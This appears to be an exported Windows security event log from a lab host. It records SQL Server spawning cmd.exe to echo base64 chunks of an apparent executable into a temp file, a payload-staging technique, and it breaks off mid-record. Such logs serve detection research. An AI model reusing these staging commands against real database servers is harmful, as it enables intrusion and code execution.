<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.140948500Z" />
      <EventRecordID>1331361</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xe64</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ZXNlIHJlc3VsdHMgYXJlIHByb2JhYmx5IG5vdCB0aGF0IHJlbGlhYmxlLgoAAAAAAABFUlJPUjogVGhlIG1lZGlhbiBhbmQgbWVhbiBmb3IgdGhlIHdhaXRpbmcgdGltZSBhcmUgbW9yZSB0aGFuIHR3aWNlIHRoZSBzdGFuZGFyZAogICAgICAgZGV2aWF0aW9uIGFwYXJ0LiBUaGVzZSByZXN1bHRzIGFyZSBOT1QgcmVsaWFibGUuCgAAAAAAAABXQVJOSU5HOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgcHJvY2Vzc2luZyB0aW1lIGFyZSBub3Qgd2l0aGluIGEgbm9ybWFsIGRldmlhdGlvbgogICAgICAgIFRoZXNlIHJlc3VsdHMgYXJlIHByb2JhYmx5IG5vdCB0aGF0IHJlbGlhYmxlLgoAAABFUlJPUjogVGhlIG1lZGlhbiBhbmQgbWVhbiBmb3IgdGhlIHByb2Nlc3NpbmcgdGltZSBhcmUgbW9yZSB0aGFuIHR3aWNlIHRoZSBzdGFuZGFyZAogICAgICAgZGV2aWF0aW9uIGFwYXJ0LiBUaGVzZSByZXN1bHRzIGFyZSBOT1QgcmVsaWFibGUuCgAAAABXQVJOSU5HOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgaW5pdGlhbCBjb25uZWN0aW9uIHRpbWUgYXJlIG5vdCB3aXRoaW4gYSBub3JtYWwgZGV2aWF0aW9uCiAgICAgICAgVGhlc2UgcmVzdWx0cyBhcmUgcHJvYmFibHkgbm90IHRoYXQgcmVsaWFibGUuCgAAAEVSUk9SOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgaW5pdGlhbCBjb25uZWN0aW9uIHRpbWUgYXJlIG1vcmUgdGhhbiB0d2ljZSB0aGUgc3RhbmRhcmQKICAgICAgIGRldmlhdGlvbiBhcGFydC4gVGhlc2UgcmVzdWx0cyBhcmUgTk9UIHJlbGlhYmxlLgoAAAAAVG90YWw6ICAgICAgJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAV2FpdGluZzogICAgJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAUHJvY2Vzc2luZzogJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAQ29ubmVjdDogICAgJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAICAgICAgICAgICAgICBtaW4gIG1lYW5bKy8tc2RdIG1lZGlhbiAgIG1heAoAAAAACkNvbm5lY3Rpb24gVGltZXMgKG1zKQoAICAgICAgICAgICAgICAgICAgICAgICAgJS4yZiBrYi9zIHRvdGFsCgAAAAAgICAgICAgICAgICAg&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.143177800Z" />
      <EventRecordID>1331362</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x704</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xe64</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.414370900Z" />
      <EventRecordID>1331363</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x82c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ICAgICAgICAgICAlLjJmIGtiL3Mgc2VudAoAVHJhbnNmZXIgcmF0ZTogICAgICAgICAgJS4yZiBbS2J5dGVzL3NlY10gcmVjZWl2ZWQKAFRpbWUgcGVyIHJlcXVlc3Q6ICAgICAgICUuM2YgW21zXSAobWVhbiwgYWNyb3NzIGFsbCBjb25jdXJyZW50IHJlcXVlc3RzKQoAAABUaW1lIHBlciByZXF1ZXN0OiAgICAgICAlLjNmIFttc10gKG1lYW4pCgAAAFJlcXVlc3RzIHBlciBzZWNvbmQ6ICAgICUuMmYgWyMvc2VjXSAobWVhbikKAAAAAEhUTUwgdHJhbnNmZXJyZWQ6ICAgICAgICVJNjRkIGJ5dGVzCgAAAABUb3RhbCBQVVQ6ICAgICAgICAgICAgICAlSTY0ZAoAAFRvdGFsIFBPU1RlZDogICAgICAgICAgICVJNjRkCgAAVG90YWwgdHJhbnNmZXJyZWQ6ICAgICAgJUk2NGQgYnl0ZXMKAAAAAEtlZXAtQWxpdmUgcmVxdWVzdHM6ICAgICVkCgBOb24tMnh4IHJlc3BvbnNlczogICAgICAlZAoAV3JpdGUgZXJyb3JzOiAgICAgICAgICAgJWQKACAgIChDb25uZWN0OiAlZCwgUmVjZWl2ZTogJWQsIExlbmd0aDogJWQsIEV4Y2VwdGlvbnM6ICVkKQoAAEZhaWxlZCByZXF1ZXN0czogICAgICAgICVkCgBDb21wbGV0ZSByZXF1ZXN0czogICAgICAlZAoAVGltZSB0YWtlbiBmb3IgdGVzdHM6ICAgJS4zZiBzZWNvbmRzCgAAAENvbmN1cnJlbmN5IExldmVsOiAgICAgICVkCgBEb2N1bWVudCBMZW5ndGg6ICAgICAgICAldSBieXRlcwoAAABEb2N1bWVudCBQYXRoOiAgICAgICAgICAlcwoAU2VydmVyIFBvcnQ6ICAgICAgICAgICAgJWh1CgAAAABTZXJ2ZXIgSG9zdG5hbWU6ICAgICAgICAlcwoAU2VydmVyIFNvZnR3YXJlOiAgICAgICAgJXMKAAoKAAA8L3RhYmxlPgoAAAAAAAAAPHRyICVzPjx0aCAlcz5Ub3RhbDo8L3RoPjx0ZCAlcz4lNUk2NGQ8L3RkPjx0ZCAlcz4lNUk2NGQ8L3RkPjx0ZCAlcz4lNUk2NGQ8L3RkPjwvdHI+CgAAADx0ciAlcz48dGggJXM+UHJvY2Vzc2luZzo8L3RoPjx0ZCAlcz4lNUk2NGQ8L3RkPjx0ZCAlcz4lNUk2NGQ8L3RkPjx0ZCAlcz4lNUk2NGQ8L3RkPjwvdHI+CgAAAAAAADx0ciAlcz48dGggJXM+Q29ubmVjdDo8L3RoPjx0ZCAlcz4lNUk2NGQ8L3RkPjx0ZCAlcz4lNUk2NGQ8L3RkPjx0ZCAlcz4lNUk2NGQ8L3RkPjwvdHI+CgA8dHIg&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.416589000Z" />
      <EventRecordID>1331364</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x9f8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x82c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.687369000Z" />
      <EventRecordID>1331365</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xd28</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo JXM+PHRoICVzPiZuYnNwOzwvdGg+IDx0aCAlcz5taW48L3RoPiAgIDx0aCAlcz5hdmc8L3RoPiAgIDx0aCAlcz5tYXg8L3RoPjwvdHI+CgA8dHIgJXM+PHRoICVzIGNvbHNwYW49ND5Db25ubmVjdGlvbiBUaW1lcyAobXMpPC90aD48L3RyPgoAAAA8dHIgJXM+PHRkIGNvbHNwYW49MiAlcz4mbmJzcDs8L3RkPjx0ZCBjb2xzcGFuPTIgJXM+JS4yZiBrYi9zIHRvdGFsPC90ZD48L3RyPgoAADx0ciAlcz48dGQgY29sc3Bhbj0yICVzPiZuYnNwOzwvdGQ+PHRkIGNvbHNwYW49MiAlcz4lLjJmIGtiL3Mgc2VudDwvdGQ+PC90cj4KAAAAPHRyICVzPjx0aCBjb2xzcGFuPTIgJXM+VHJhbnNmZXIgcmF0ZTo8L3RoPjx0ZCBjb2xzcGFuPTIgJXM+JS4yZiBrYi9zIHJlY2VpdmVkPC90ZD48L3RyPgoAAAAAAAAAPHRyICVzPjx0aCBjb2xzcGFuPTIgJXM+UmVxdWVzdHMgcGVyIHNlY29uZDo8L3RoPjx0ZCBjb2xzcGFuPTIgJXM+JS4yZjwvdGQ+PC90cj4KAAAAAAAAADx0ciAlcz48dGggY29sc3Bhbj0yICVzPkhUTUwgdHJhbnNmZXJyZWQ6PC90aD48dGQgY29sc3Bhbj0yICVzPiVJNjRkIGJ5dGVzPC90ZD48L3RyPgoAAAA8dHIgJXM+PHRoIGNvbHNwYW49MiAlcz5Ub3RhbCBQVVQ6PC90aD48dGQgY29sc3Bhbj0yICVzPiVJNjRkPC90ZD48L3RyPgoAAAAAAAAAADx0ciAlcz48dGggY29sc3Bhbj0yICVzPlRvdGFsIFBPU1RlZDo8L3RoPjx0ZCBjb2xzcGFuPTIgJXM+JUk2NGQ8L3RkPjwvdHI+CgAAAAAAPHRyICVzPjx0aCBjb2xzcGFuPTIgJXM+VG90YWwgdHJhbnNmZXJyZWQ6PC90aD48dGQgY29sc3Bhbj0yICVzPiVJNjRkIGJ5dGVzPC90ZD48L3RyPgoAADx0ciAlcz48dGggY29sc3Bhbj0yICVzPktlZXAtQWxpdmUgcmVxdWVzdHM6PC90aD48dGQgY29sc3Bhbj0yICVzPiVkPC90ZD48L3RyPgoAPHRyICVzPjx0aCBjb2xzcGFuPTIgJXM+Tm9uLTJ4eCByZXNwb25zZXM6PC90aD48dGQgY29sc3Bhbj0yICVzPiVkPC90ZD48L3RyPgoAAAA8dHIgJXM+PHRkIGNvbHNwYW49NCAlcyA+ICAgKENvbm5lY3Q6ICVkLCBMZW5ndGg6ICVkLCBFeGNlcHRpb25zOiAlZCk8L3RkPjwvdHI+CgAAAAAAAAAAPHRyICVzPjx0aCBjb2xzcGFuPTIgJXM+RmFpbGVkIHJlcXVlc3Rz&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.689568500Z" />
      <EventRecordID>1331366</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x10f4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xd28</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.962048000Z" />
      <EventRecordID>1331367</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x840</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo OjwvdGg+PHRkIGNvbHNwYW49MiAlcz4lZDwvdGQ+PC90cj4KAAAAAAA8dHIgJXM+PHRoIGNvbHNwYW49MiAlcz5Db21wbGV0ZSByZXF1ZXN0czo8L3RoPjx0ZCBjb2xzcGFuPTIgJXM+JWQ8L3RkPjwvdHI+CgAAADx0ciAlcz48dGggY29sc3Bhbj0yICVzPlRpbWUgdGFrZW4gZm9yIHRlc3RzOjwvdGg+PHRkIGNvbHNwYW49MiAlcz4lLjNmIHNlY29uZHM8L3RkPjwvdHI+CgAAAAAAADx0ciAlcz48dGggY29sc3Bhbj0yICVzPkNvbmN1cnJlbmN5IExldmVsOjwvdGg+PHRkIGNvbHNwYW49MiAlcz4lZDwvdGQ+PC90cj4KAAAAPHRyICVzPjx0aCBjb2xzcGFuPTIgJXM+RG9jdW1lbnQgTGVuZ3RoOjwvdGg+PHRkIGNvbHNwYW49MiAlcz4ldSBieXRlczwvdGQ+PC90cj4KAAAAAAAAADx0ciAlcz48dGggY29sc3Bhbj0yICVzPkRvY3VtZW50IFBhdGg6PC90aD48dGQgY29sc3Bhbj0yICVzPiVzPC90ZD48L3RyPgoAAAAAAAAAPHRyICVzPjx0aCBjb2xzcGFuPTIgJXM+U2VydmVyIFBvcnQ6PC90aD48dGQgY29sc3Bhbj0yICVzPiVodTwvdGQ+PC90cj4KAAAAAAAAAAA8dHIgJXM+PHRoIGNvbHNwYW49MiAlcz5TZXJ2ZXIgSG9zdG5hbWU6PC90aD48dGQgY29sc3Bhbj0yICVzPiVzPC90ZD48L3RyPgoAAAAAADx0ciAlcz48dGggY29sc3Bhbj0yICVzPlNlcnZlciBTb2Z0d2FyZTo8L3RoPjx0ZCBjb2xzcGFuPTIgJXM+JXM8L3RkPjwvdHI+CgAKCjx0YWJsZSAlcz4KAAAAc29ja2V0IHJlY2VpdmUgYnVmZmVyAAAAc29ja2V0IHNlbmQgYnVmZmVyAABzb2NrZXQgbm9uYmxvY2sAc29ja2V0AABDb21wbGV0ZWQgJWQgcmVxdWVzdHMKAABDb250ZW50LWxlbmd0aDoAQ29udGVudC1MZW5ndGg6AGtlZXAtYWxpdmUAAEtlZXAtQWxpdmUAAExPRzogUmVzcG9uc2UgY29kZSA9ICVzCgAAAABXQVJOSU5HOiBSZXNwb25zZSBjb2RlIG5vdCAyeHggKCVzKQoAAAAANTAwAEhUVFAAAAAAU2VydmVyOgANCg0KAAAAAExPRzogaGVhZGVyIHJlY2VpdmVkOgolcwoAAABhcHJfc29ja2V0X3JlY3YAPC9wPgo8cD4KAAAAIExpY2Vuc2VkIHRvIFRoZSBBcGFjaGUgU29mdHdhcmUgRm91bmRhdGlvbiwgaHR0cDovL3d3dy5hcGFjaGUub3JnLzxicj4KAAAAAAAAAAAgQ29weXJpZ2h0&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:23.964219500Z" />
      <EventRecordID>1331368</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1068</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x840</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:24.236040600Z" />
      <EventRecordID>1331369</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xe14</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo IDE5OTYgQWRhbSBUd2lzcywgWmV1cyBUZWNobm9sb2d5IEx0ZCwgaHR0cDovL3d3dy56ZXVzdGVjaC5uZXQvPGJyPgoAACBUaGlzIGlzIEFwYWNoZUJlbmNoLCBWZXJzaW9uICVzIDxpPiZsdDslcyZndDs8L2k+PGJyPgoAJFJldmlzaW9uOiA2NTU2NTQgJAA8cD4KAAAAAAAAAABMaWNlbnNlZCB0byBUaGUgQXBhY2hlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGh0dHA6Ly93d3cuYXBhY2hlLm9yZy8KAAAAAABDb3B5cmlnaHQgMTk5NiBBZGFtIFR3aXNzLCBaZXVzIFRlY2hub2xvZ3kgTHRkLCBodHRwOi8vd3d3LnpldXN0ZWNoLm5ldC8KAAAAVGhpcyBpcyBBcGFjaGVCZW5jaCwgVmVyc2lvbiAlcwoAAAAAMi4zIDwkUmV2aXNpb246IDY1NTY1NCAkPgAAACAgICAtaCAgICAgICAgICAgICAgRGlzcGxheSB1c2FnZSBpbmZvcm1hdGlvbiAodGhpcyBtZXNzYWdlKQoAAAAgICAgLXIgICAgICAgICAgICAgIERvbid0IGV4aXQgb24gc29ja2V0IHJlY2VpdmUgZXJyb3JzLgoAAAAgICAgLWUgZmlsZW5hbWUgICAgIE91dHB1dCBDU1YgZmlsZSB3aXRoIHBlcmNlbnRhZ2VzIHNlcnZlZAoAAAAAICAgIC1nIGZpbGVuYW1lICAgICBPdXRwdXQgY29sbGVjdGVkIGRhdGEgdG8gZ251cGxvdCBmb3JtYXQgZmlsZS4KAAAAAAAAICAgIC1TICAgICAgICAgICAgICBEbyBub3Qgc2hvdyBjb25maWRlbmNlIGVzdGltYXRvcnMgYW5kIHdhcm5pbmdzLgoAAAAAICAgIC1kICAgICAgICAgICAgICBEbyBub3Qgc2hvdyBwZXJjZW50aWxlcyBzZXJ2ZWQgdGFibGUuCgAAICAgIC1rICAgICAgICAgICAgICBVc2UgSFRUUCBLZWVwQWxpdmUgZmVhdHVyZQoAICAgIC1WICAgICAgICAgICAgICBQcmludCB2ZXJzaW9uIG51bWJlciBhbmQgZXhpdAoAACAgICAtWCBwcm94eTpwb3J0ICAgUHJveHlzZXJ2ZXIgYW5kIHBvcnQgbnVtYmVyIHRvIHVzZQoAICAgIC1QIGF0dHJpYnV0ZSAgICBBZGQgQmFzaWMgUHJveHkgQXV0aGVudGljYXRpb24sIHRoZSBhdHRyaWJ1dGVzCgAAAAAAICAgICAgICAgICAgICAgICAgICBhcmUgYSBjb2xvbiBzZXBhcmF0ZWQgdXNlcm5hbWUgYW5kIHBhc3N3b3JkLgoAAAAAAAAAICAgIC1BIGF0dHJpYnV0ZSAgICBBZGQgQmFzaWMgV1dXIEF1dGhlbnRpY2F0&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:24.238339400Z" />
      <EventRecordID>1331370</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x48c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xe14</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
